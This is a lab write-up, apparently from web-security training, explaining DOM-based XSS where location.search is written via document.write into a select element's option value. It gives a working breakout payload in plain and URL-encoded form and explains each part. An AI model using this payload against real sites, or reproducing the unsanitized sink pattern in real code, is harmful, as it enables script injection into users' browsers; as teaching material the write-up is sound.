# Lab: DOM XSS in `document.write` sink using source `location.search` inside a `<select>` element

## Overview

This lab demonstrates a **DOM-Based Cross-Site Scripting (DOM XSS)** vulnerability.

Unlike Reflected or Stored XSS, the payload is processed entirely by the browser using JavaScript. The server is never involved.

---

## Source

The source is:

```javascript
location.search
```

The application reads user input from the URL after the `?`.

Example:

```
https://example.com/?store=London
```

---

## Sink

The sink is:

```javascript
document.write()
```

`document.write()` writes the user input directly into the HTML page.

If the input is not sanitized, an attacker can inject arbitrary HTML or JavaScript.

---

## Vulnerable Code

The application generates the following HTML:

```html
<select name="store">
    <option value="USER_INPUT">London</option>
</select>
```

The value from `location.search` is placed inside the `value` attribute.

---

## Goal

Break out of the current HTML structure and inject a new HTML element that executes JavaScript.

---

## Payload

```html
"></select><img src=1 onerror=alert(1)>
```

URL Encoded:

```text
%22%3E%3C/select%3E%3Cimg%20src=1%20onerror=alert(1)%3E
```

---

## Payload Breakdown

### Close the `value` attribute

```html
"
```

Closes the original attribute.

---

### Close the `<select>` element

```html
</select>
```

Escapes from the developer's HTML structure.

---

### Inject a new HTML element

```html
<img src=1 onerror=alert(1)>
```

- `src=1` causes the image to fail loading.
- `onerror` executes when the image fails to load.
- `alert(1)` proves JavaScript execution.

---

## Result

The HTML becomes:

```html
<select name="store">
    <option value=""></option>
</select>

<img src=1 onerror=alert(1)>
```

The injected `<img>` tag is now outside the `<select>` element and executes successfully.

---

## Why did the attack work?

- User input comes from `location.search`.
- The application writes it using `document.write()`.
- No HTML encoding or input validation is performed.
- The attacker escapes the original HTML structure and injects a malicious element.

---

## Key Points

- **Type:** DOM-Based XSS
- **Source:** `location.search`
- **Sink:** `document.write()`
- **Payload:** `"></select><img src=1 onerror=alert(1)>`